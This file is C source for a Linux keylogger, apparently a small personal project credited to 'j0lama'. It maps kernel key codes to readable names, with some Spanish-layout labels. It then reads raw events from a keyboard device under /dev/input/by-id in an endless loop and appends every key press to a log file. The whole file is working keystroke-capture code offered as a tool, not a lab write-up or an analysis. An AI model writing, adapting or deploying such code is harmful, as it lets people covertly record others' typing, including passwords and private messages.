//--------------------------------//
//       Developed by j0lama      //
// Visit: jolama.es for more info //
//--------------------------------//

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <linux/input.h>
#include <unistd.h>


char *keys[KEY_MAX + 1] = {
    [0 ... KEY_MAX] = NULL,
    [KEY_RESERVED] = "Reserved",        [KEY_ESC] = "Esc",
    [KEY_1] = "1",              [KEY_2] = "2",
    [KEY_3] = "3",              [KEY_4] = "4",
    [KEY_5] = "5",              [KEY_6] = "6",
    [KEY_7] = "7",              [KEY_8] = "8",
    [KEY_9] = "9",              [KEY_0] = "0",
    [KEY_MINUS] = "'",          [KEY_EQUAL] = "¡",
    [KEY_BACKSPACE] = "Delete",      [KEY_TAB] = "Tab",
    [KEY_Q] = "q",              [KEY_W] = "w",
    [KEY_E] = "e",              [KEY_R] = "r",
    [KEY_T] = "t",              [KEY_Y] = "y",
    [KEY_U] = "u",              [KEY_I] = "i",
    [KEY_O] = "o",              [KEY_P] = "p",
    [KEY_LEFTBRACE] = "`",      [KEY_RIGHTBRACE] = "+",
    [KEY_ENTER] = "Enter",          [KEY_LEFTCTRL] = "LeftControl",
    [KEY_A] = "a",              [KEY_S] = "s",
    [KEY_D] = "d",              [KEY_F] = "f",
    [KEY_G] = "g",              [KEY_H] = "h",
    [KEY_J] = "j",              [KEY_K] = "k",
    [KEY_L] = "l",              [KEY_SEMICOLON] = "Semicolon",
    [KEY_APOSTROPHE] = "´",    [KEY_GRAVE] = "Grave",
    [KEY_LEFTSHIFT] = "LeftShift",      [KEY_BACKSLASH] = "Cc",
    [KEY_Z] = "z",              [KEY_X] = "x",
    [KEY_C] = "c",              [KEY_V] = "v",
    [KEY_B] = "b",              [KEY_N] = "n",
    [KEY_M] = "m",              [KEY_COMMA] = "Comma",
    [KEY_DOT] = "Dot",          [KEY_SLASH] = "Slash",
    [KEY_RIGHTSHIFT] = "RightShift",    [KEY_KPASTERISK] = "KPAsterisk",
    [KEY_LEFTALT] = "LeftAlt",      [KEY_SPACE] = "Space",
    [KEY_CAPSLOCK] = "CapsLock",        [KEY_F1] = "F1",
    [KEY_F2] = "F2",            [KEY_F3] = "F3",
    [KEY_F4] = "F4",            [KEY_F5] = "F5",
    [KEY_F6] = "F6",            [KEY_F7] = "F7",
    [KEY_F8] = "F8",            [KEY_F9] = "F9",
    [KEY_F10] = "F10",          [KEY_NUMLOCK] = "NumLock",
    [KEY_SCROLLLOCK] = "ScrollLock",    [KEY_KP7] = "KP7",
    [KEY_KP8] = "KP8",          [KEY_KP9] = "KP9",
    [KEY_KPMINUS] = "KPMinus",      [KEY_KP4] = "KP4",
    [KEY_KP5] = "KP5",          [KEY_KP6] = "KP6",
    [KEY_KPPLUS] = "KPPlus",        [KEY_KP1] = "KP1",
    [KEY_KP2] = "KP2",          [KEY_KP3] = "KP3",
    [KEY_KP0] = "KP0",          [KEY_KPDOT] = "KPDot",
    [KEY_ZENKAKUHANKAKU] = "Zenkaku/Hankaku", [KEY_102ND] = "102nd",
    [KEY_F11] = "F11",          [KEY_F12] = "F12",
    [KEY_RO] = "RO",            [KEY_KATAKANA] = "Katakana",
    [KEY_HIRAGANA] = "HIRAGANA",        [KEY_HENKAN] = "Henkan",
    [KEY_KATAKANAHIRAGANA] = "Katakana/Hiragana", [KEY_MUHENKAN] = "Muhenkan",
    [KEY_KPJPCOMMA] = "KPJpComma",      [KEY_KPENTER] = "KPEnter",
    [KEY_RIGHTCTRL] = "RightCtrl",      [KEY_KPSLASH] = "KPSlash",
    [KEY_SYSRQ] = "SysRq",          [KEY_RIGHTALT] = "RightAlt",
    [KEY_LINEFEED] = "LineFeed",        [KEY_HOME] = "Home",
    [KEY_UP] = "Up",            [KEY_PAGEUP] = "PageUp",
    [KEY_LEFT] = "Left",            [KEY_RIGHT] = "Right",
    [KEY_END] = "End",          [KEY_DOWN] = "Down",
    [KEY_PAGEDOWN] = "PageDown",        [KEY_INSERT] = "Insert",
    [KEY_DELETE] = "Supr",        [KEY_MACRO] = "Macro",
    [KEY_MUTE] = "Mute",            [KEY_VOLUMEDOWN] = "VolumeDown",
    [KEY_VOLUMEUP] = "VolumeUp",        [KEY_POWER] = "Power",
    [KEY_KPEQUAL] = "KPEqual",      [KEY_KPPLUSMINUS] = "KPPlusMinus",
    [KEY_PAUSE] = "Pause",          [KEY_KPCOMMA] = "KPComma",
    [KEY_HANGUEL] = "Hanguel",      [KEY_HANJA] = "Hanja",
    [KEY_YEN] = "Yen",          [KEY_LEFTMETA] = "LeftMeta",
    [KEY_RIGHTMETA] = "RightMeta",      [KEY_COMPOSE] = "Compose",
    [KEY_STOP] = "Stop",            [KEY_AGAIN] = "Again",
    [KEY_PROPS] = "Props",          [KEY_UNDO] = "Undo",
    [KEY_FRONT] = "Front",          [KEY_COPY] = "Copy",
    [KEY_OPEN] = "Open",            [KEY_PASTE] = "Paste",
    [KEY_FIND] = "Find",            [KEY_CUT] = "Cut",
    [KEY_HELP] = "Help",            [KEY_MENU] = "Menu",
    [KEY_CALC] = "Calc",            [KEY_SETUP] = "Setup",
    [KEY_SLEEP] = "Sleep",          [KEY_WAKEUP] = "WakeUp",
    [KEY_FILE] = "File",            [KEY_SENDFILE] = "SendFile",
    [KEY_DELETEFILE] = "DeleteFile",    [KEY_XFER] = "X-fer",
    [KEY_PROG1] = "Prog1",          [KEY_PROG2] = "Prog2",
    [KEY_WWW] = "WWW",          [KEY_MSDOS] = "MSDOS",
    [KEY_COFFEE] = "Coffee",        [KEY_DIRECTION] = "Direction",
    [KEY_CYCLEWINDOWS] = "CycleWindows",    [KEY_MAIL] = "Mail",
    [KEY_BOOKMARKS] = "Bookmarks",      [KEY_COMPUTER] = "Computer",
    [KEY_BACK] = "Back",            [KEY_FORWARD] = "Forward",
    [KEY_CLOSECD] = "CloseCD",      [KEY_EJECTCD] = "EjectCD",
    [KEY_EJECTCLOSECD] = "EjectCloseCD",    [KEY_NEXTSONG] = "NextSong",
    [KEY_PLAYPAUSE] = "PlayPause",      [KEY_PREVIOUSSONG] = "PreviousSong",
    [KEY_STOPCD] = "StopCD",        [KEY_RECORD] = "Record",
    [KEY_REWIND] = "Rewind",        [KEY_PHONE] = "Phone",
    [KEY_ISO] = "ISOKey",           [KEY_CONFIG] = "Config",
    [KEY_HOMEPAGE] = "HomePage",        [KEY_REFRESH] = "Refresh",
    [KEY_EXIT] = "Exit",            [KEY_MOVE] = "Move",
    [KEY_EDIT] = "Edit",            [KEY_SCROLLUP] = "ScrollUp",
    [KEY_SCROLLDOWN] = "ScrollDown",    [KEY_KPLEFTPAREN] = "KPLeftParenthesis",
    [KEY_KPRIGHTPAREN] = "KPRightParenthesis", [KEY_F13] = "F13",
    [KEY_F14] = "F14",          [KEY_F15] = "F15",
    [KEY_F16] = "F16",          [KEY_F17] = "F17",
    [KEY_F18] = "F18",          [KEY_F19] = "F19",
    [KEY_F20] = "F20",          [KEY_F21] = "F21",
    [KEY_F22] = "F22",          [KEY_F23] = "F23",
    [KEY_F24] = "F24",          [KEY_PLAYCD] = "PlayCD",
    [KEY_PAUSECD] = "PauseCD",      [KEY_PROG3] = "Prog3",
    [KEY_PROG4] = "Prog4",          [KEY_SUSPEND] = "Suspend",
    [KEY_CLOSE] = "Close",          [KEY_PLAY] = "Play",
    [KEY_FASTFORWARD] = "Fast Forward", [KEY_BASSBOOST] = "Bass Boost",
    [KEY_PRINT] = "Print",          [KEY_HP] = "HP",
    [KEY_CAMERA] = "Camera",        [KEY_SOUND] = "Sound",
    [KEY_QUESTION] = "Question",        [KEY_EMAIL] = "Email",
    [KEY_CHAT] = "Chat",            [KEY_SEARCH] = "Search",
    [KEY_CONNECT] = "Connect",      [KEY_FINANCE] = "Finance",
    [KEY_SPORT] = "Sport",          [KEY_SHOP] = "Shop",
    [KEY_ALTERASE] = "Alternate Erase", [KEY_CANCEL] = "Cancel",
    [KEY_BRIGHTNESSDOWN] = "Brightness down", [KEY_BRIGHTNESSUP] = "Brightness up",
    [KEY_MEDIA] = "Media",          [KEY_UNKNOWN] = "Unknown",
    [BTN_0] = "Btn0",           [BTN_1] = "Btn1",
    [BTN_2] = "Btn2",           [BTN_3] = "Btn3",
    [BTN_4] = "Btn4",           [BTN_5] = "Btn5",
    [BTN_6] = "Btn6",           [BTN_7] = "Btn7",
    [BTN_8] = "Btn8",           [BTN_9] = "Btn9",
    [BTN_LEFT] = "LeftBtn",         [BTN_RIGHT] = "RightBtn",
    [BTN_MIDDLE] = "MiddleBtn",     [BTN_SIDE] = "SideBtn",
    [BTN_EXTRA] = "ExtraBtn",       [BTN_FORWARD] = "ForwardBtn",
    [BTN_BACK] = "BackBtn",         [BTN_TASK] = "TaskBtn",
    [BTN_TRIGGER] = "Trigger",      [BTN_THUMB] = "ThumbBtn",
    [BTN_THUMB2] = "ThumbBtn2",     [BTN_TOP] = "TopBtn",
    [BTN_TOP2] = "TopBtn2",         [BTN_PINKIE] = "PinkieBtn",
    [BTN_BASE] = "BaseBtn",         [BTN_BASE2] = "BaseBtn2",
    [BTN_BASE3] = "BaseBtn3",       [BTN_BASE4] = "BaseBtn4",
    [BTN_BASE5] = "BaseBtn5",       [BTN_BASE6] = "BaseBtn6",
    [BTN_DEAD] = "BtnDead",         [BTN_A] = "BtnA",
    [BTN_B] = "BtnB",           [BTN_C] = "BtnC",
    [BTN_X] = "BtnX",           [BTN_Y] = "BtnY",
    [BTN_Z] = "BtnZ",           [BTN_TL] = "BtnTL",
    [BTN_TR] = "BtnTR",         [BTN_TL2] = "BtnTL2",
    [BTN_TR2] = "BtnTR2",           [BTN_SELECT] = "BtnSelect",
    [BTN_START] = "BtnStart",       [BTN_MODE] = "BtnMode",
    [BTN_THUMBL] = "BtnThumbL",     [BTN_THUMBR] = "BtnThumbR",
    [BTN_TOOL_PEN] = "ToolPen",     [BTN_TOOL_RUBBER] = "ToolRubber",
    [BTN_TOOL_BRUSH] = "ToolBrush",     [BTN_TOOL_PENCIL] = "ToolPencil",
    [BTN_TOOL_AIRBRUSH] = "ToolAirbrush",   [BTN_TOOL_FINGER] = "ToolFinger",
    [BTN_TOOL_MOUSE] = "ToolMouse",     [BTN_TOOL_LENS] = "ToolLens",
    [BTN_TOUCH] = "Touch",          [BTN_STYLUS] = "Stylus",
    [BTN_STYLUS2] = "Stylus2",      [BTN_TOOL_DOUBLETAP] = "Tool Doubletap",
    [BTN_TOOL_TRIPLETAP] = "Tool Tripletap", [BTN_GEAR_DOWN] = "WheelBtn",
    [BTN_GEAR_UP] = "Gear up",      [KEY_OK] = "Ok",
    [KEY_SELECT] = "Select",        [KEY_GOTO] = "Goto",
    [KEY_CLEAR] = "Clear",          [KEY_POWER2] = "Power2",
    [KEY_OPTION] = "Option",        [KEY_INFO] = "Info",
    [KEY_TIME] = "Time",            [KEY_VENDOR] = "Vendor",
    [KEY_ARCHIVE] = "Archive",      [KEY_PROGRAM] = "Program",
    [KEY_CHANNEL] = "Channel",      [KEY_FAVORITES] = "Favorites",
    [KEY_EPG] = "EPG",          [KEY_PVR] = "PVR",
    [KEY_MHP] = "MHP",          [KEY_LANGUAGE] = "Language",
    [KEY_TITLE] = "Title",          [KEY_SUBTITLE] = "Subtitle",
    [KEY_ANGLE] = "Angle",          [KEY_ZOOM] = "Zoom",
    [KEY_MODE] = "Mode",            [KEY_KEYBOARD] = "Keyboard",
    [KEY_SCREEN] = "Screen",        [KEY_PC] = "PC",
    [KEY_TV] = "TV",            [KEY_TV2] = "TV2",
    [KEY_VCR] = "VCR",          [KEY_VCR2] = "VCR2",
    [KEY_SAT] = "Sat",          [KEY_SAT2] = "Sat2",
    [KEY_CD] = "CD",            [KEY_TAPE] = "Tape",
    [KEY_RADIO] = "Radio",          [KEY_TUNER] = "Tuner",
    [KEY_PLAYER] = "Player",        [KEY_TEXT] = "Text",
    [KEY_DVD] = "DVD",          [KEY_AUX] = "Aux",
    [KEY_MP3] = "MP3",          [KEY_AUDIO] = "Audio",
    [KEY_VIDEO] = "Video",          [KEY_DIRECTORY] = "Directory",
    [KEY_LIST] = "List",            [KEY_MEMO] = "Memo",
    [KEY_CALENDAR] = "Calendar",        [KEY_RED] = "Red",
    [KEY_GREEN] = "Green",          [KEY_YELLOW] = "Yellow",
    [KEY_BLUE] = "Blue",            [KEY_CHANNELUP] = "ChannelUp",
    [KEY_CHANNELDOWN] = "ChannelDown",  [KEY_FIRST] = "First",
    [KEY_LAST] = "Last",            [KEY_AB] = "AB",
    [KEY_NEXT] = "Next",            [KEY_RESTART] = "Restart",
    [KEY_SLOW] = "Slow",            [KEY_SHUFFLE] = "Shuffle",
    [KEY_BREAK] = "Break",          [KEY_PREVIOUS] = "Previous",
    [KEY_DIGITS] = "Digits",        [KEY_TEEN] = "TEEN",
    [KEY_TWEN] = "TWEN",            [KEY_DEL_EOL] = "Delete EOL",
    [KEY_DEL_EOS] = "Delete EOS",       [KEY_INS_LINE] = "Insert line",
    [KEY_DEL_LINE] = "Delete line",
};


int main(int argc, char** argv) {
    size_t rb;
    /* the events (up to 64 at once) */
    struct input_event ev[64];
    int yalv;
    int keybrdToCapture;
    char path[1000];
    FILE * file;
    if(argc != 3)
    {
        printf("./keylogger <Keyboard descriptor path> <Log file>\n");
        return 1;
    }

    file = fopen(".log", "a");
    if(file == NULL)
        return 1;

    sprintf(path, "/dev/input/by-id/%s", argv[1]);

    if((keybrdToCapture = open(path, O_RDONLY)) == -1) {
        perror("opening device");
        return 1;
    }
    while(1)
    {
        rb=read(keybrdToCapture,ev,sizeof(struct input_event)*64);

        for (yalv = 0; yalv < (int) (rb / sizeof(struct input_event)); yalv++)
        {
            file = fopen(argv[2], "a");
            if(file == NULL)
                return 1;
            if (EV_KEY == ev[yalv].type && ev[yalv].value == 1){
                fprintf(file, "%s\n", keys[ev[yalv].code]);
            }
            fclose(file);
        }
    }
    return 0;
}